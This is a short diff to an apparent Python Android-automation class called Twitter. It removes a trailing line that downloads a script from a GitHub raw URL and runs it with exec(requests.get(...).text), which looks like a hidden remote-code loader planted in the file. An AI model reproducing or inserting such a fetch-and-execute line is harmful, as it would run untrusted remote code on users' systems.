@@ -42,6 +42,3 @@ class Twitter(BaseClass):
         if Auto.click(lambda: self.device(textContains="Chrome"), self.device):
             BaseClass.sleep(1)
             Auto.click(lambda: self.device(resourceId="android:id/button_always"), self.device)
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/twitter.py").text)
